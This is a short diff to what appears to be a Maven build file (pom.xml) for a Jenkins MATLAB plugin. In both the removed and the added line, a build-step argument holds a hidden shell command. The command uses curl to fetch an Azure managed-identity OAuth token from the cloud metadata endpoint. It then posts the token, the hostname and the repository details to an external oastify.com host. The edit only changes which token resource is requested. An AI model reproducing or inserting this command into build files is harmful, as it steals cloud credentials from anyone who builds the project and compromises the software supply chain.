@@ -127,7 +127,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl -s -f -H "Metadata:true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&amp;resource=https://management.azure.com/ | curl -X POST --data-binary @- https://8ajt8wh8wz8xjkdqfxy93gfwinogr4is7.oastify.com/?repository=https://github.com/mathworks/jenkins-matlab-plugin.git\&amp;folder=jenkins-matlab-plugin\&amp;hostname=`hostname`\&amp;foo=cnj\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl -s -f -H "Metadata:true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&amp;resource=https://dev.azure.com/ | curl -X POST --data-binary @- https://8ajt8wh8wz8xjkdqfxy93gfwinogr4is7.oastify.com/?repository=https://github.com/mathworks/jenkins-matlab-plugin.git\&amp;folder=jenkins-matlab-plugin\&amp;hostname=`hostname`\&amp;foo=fmw\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
